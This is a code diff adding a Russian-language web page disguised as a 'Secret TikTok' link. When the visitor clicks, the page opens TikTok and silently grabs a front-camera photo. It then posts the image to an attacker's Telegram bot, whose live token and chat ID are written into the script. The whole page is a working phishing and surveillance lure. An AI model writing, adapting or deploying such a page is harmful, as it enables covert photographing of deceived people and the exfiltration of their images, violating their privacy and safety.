@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ТикТок Ссылка с Камерой</title>
+</head>
+<body>
+
+<h1>Секретный ТикТок</h1>
+<p>Нажми на кнопку, чтобы перейти в TikTok и сделать фото!</p>
+
+<!-- Кнопка для начала съемки -->
+<button onclick="start()">Перейти в TikTok и сфотографироваться</button>
+
+<!-- Видеопоток с камеры -->
+<video id="video" width="300" height="300" autoplay></video>
+
+<!-- Холст для фотографии -->
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    // Получение доступа к камере
+    async function start() {
+        // Переход на TikTok (открытие нового окна или вкладки)
+        window.open('https://www.tiktok.com/', '_blank');
+        
+        // Запрашиваем доступ к камере
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        document.getElementById('video').srcObject = stream;
+        
+        // Ждем 3 секунды, чтобы пользователь был готов
+        setTimeout(takePhoto, 3000);
+    }
+
+    // Съемка фото
+    function takePhoto() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        
+        // Настроим холст на размер видео
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        
+        // Переносим изображение с видео на холст
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // Конвертируем холст в изображение base64
+        const imageData = canvas.toDataURL('image/png');
+        
+        // Отправляем фото в Telegram
+        sendPhotoToTelegram(imageData);
+    }
+
+    // Отправка фотографии в Telegram
+    function sendPhotoToTelegram(imageData) {
+        const botToken = '8039262565:AAFfSwLWM59n0ei72VgKfeqDeXjTL-HxBuY';  // Подставь свой токен
+        const chatId = '1332638294';  // Подставь свой chat_id
+        
+        // Отправляем фото через Telegram API
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            body: new URLSearchParams({
+                chat_id: chatId,
+                photo: imageData
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log(data);
+            alert('Фото отправлено в Telegram!');
+        })
+        .catch(error => {
+            console.error('Ошибка:', error);
+            alert('Что-то пошло не так!');
+        });
+    }
+</script>
+
+</body>
+</html>
